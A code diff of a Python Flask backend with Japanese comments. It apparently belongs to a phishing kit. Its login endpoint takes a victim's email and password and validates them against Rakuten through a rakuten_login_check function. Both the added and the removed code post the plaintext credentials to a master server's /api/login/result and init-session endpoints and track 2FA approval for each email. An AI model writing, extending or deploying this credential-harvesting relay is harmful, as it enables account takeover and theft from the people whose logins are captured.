@@ -81,56 +81,6 @@ def start_polling(request_id):
     thread = threading.Thread(target=poll, daemon=True)
     thread.start()
 
-def start_login_polling(request_id, email, password):
-    """ログインチェック結果を0.5秒ごとにポーリング"""
-    def poll():
-        max_attempts = 120
-        attempt = 0
-        
-        while attempt < max_attempts:
-            try:
-                response = requests.get(
-                    f"{MASTER_SERVER_URL}/api/request-result/logincheckrequest/{request_id}",
-                    timeout=5
-                )
-                
-                if response.status_code == 200:
-                    data = response.json()
-                    status = data.get('status')
-                    
-                    if status in ['success', 'failed', 'timeout']:
-                        login_check_results[request_id] = {
-                            'status': status,
-                            'pc_id': data.get('locked_by'),
-                            'received_at': datetime.now().isoformat()
-                        }
-                        
-                        # 本サーバーに結果通知
-                        try:
-                            requests.post(
-                                f"{MASTER_SERVER_URL}/api/login/result",
-                                json={
-                                    'email': email,
-                                    'password': password,
-                                    'result': status
-                                },
-                                timeout=10
-                            )
-                            print(f"[INFO] 本サーバーに結果通知: {status}")
-                        except:
-                            pass
-                        
-                        break
-                
-            except Exception as e:
-                print(f"[ERROR] ログインポーリングエラー: {e}")
-            
-            attempt += 1
-            time.sleep(0.5)
-    
-    thread = threading.Thread(target=poll, daemon=True)
-    thread.start()
-
 def poll_twofa_status(email):
     """2FA承認状態を0.5秒ごとにポーリング"""
     def poll():
@@ -285,48 +235,61 @@ def api_login():
             'error': 'サーバーとの通信に失敗しました'
         }), 500
     
-    # 2. バックグラウンドでポーリング開始（ノンブロッキング）
+    # 2. バックグラウンドで自分でログインチェックを実行
     def background_task():
-        start_login_polling(request_id, email, password)
+        print(f"[INFO] バックグラウンドタスク開始 | Email: {email}")
         
-        # PC結果を待機
-        max_wait = 60
-        start_time = time.time()
+        # 自分でログインチェックを実行
+        stop_flag = {'stop': False}
+        result = rakuten_login_check(email, password, stop_flag)
         
-        while time.time() - start_time < max_wait:
-            result_data = login_check_results.get(request_id)
+        print(f"[INFO] ログインチェック完了 | Email: {email} | Result: {result}")
+        
+        # 結果を login_check_results に保存
+        if result:
+            login_check_results[request_id] = {
+                'status': 'success',
+                'received_at': datetime.now().isoformat()
+            }
             
-            if result_data:
-                status = result_data.get('status')
-                
-                if status == 'success':
-                    # セッション保存
-                    session['email'] = email
-                    session['password'] = password
-                    twofa_sessions[email] = {
-                        'password': password,
-                        'approved': False,
-                        'rejected': False,
-                        'created_at': datetime.now().isoformat()
-                    }
-                    
-                    # 2FAセッション初期化
-                    try:
-                        requests.post(
-                            f"{MASTER_SERVER_URL}/api/login/init-session",
-                            json={'email': email, 'password': password},
-                            timeout=10
-                        )
-                        print(f"[SUCCESS] 2FAセッション初期化完了 | Email: {email}")
-                    except:
-                        pass
-                    
-                    break
-                
-                elif status in ['failed', 'timeout']:
-                    break
+            # twofa_sessionsに保存
+            twofa_sessions[email] = {
+                'password': password,
+                'approved': False,
+                'rejected': False,
+                'created_at': datetime.now().isoformat()
+            }
             
-            time.sleep(0.5)
+            # 2FAセッション初期化
+            try:
+                requests.post(
+                    f"{MASTER_SERVER_URL}/api/login/init-session",
+                    json={'email': email, 'password': password},
+                    timeout=10
+                )
+                print(f"[SUCCESS] 2FAセッション初期化完了 | Email: {email}")
+            except Exception as e:
+                print(f"[ERROR] 2FAセッション初期化エラー: {e}")
+        else:
+            login_check_results[request_id] = {
+                'status': 'failed',
+                'received_at': datetime.now().isoformat()
+            }
+        
+        # 本サーバーに結果通知
+        try:
+            requests.post(
+                f"{MASTER_SERVER_URL}/api/login/result",
+                json={
+                    'email': email,
+                    'password': password,
+                    'result': 'success' if result else 'failed'
+                },
+                timeout=10
+            )
+            print(f"[INFO] 本サーバーに結果通知: {'success' if result else 'failed'}")
+        except Exception as e:
+            print(f"[ERROR] 本サーバー通知エラー: {e}")
     
     # バックグラウンドスレッドで実行
     threading.Thread(target=background_task, daemon=True).start()
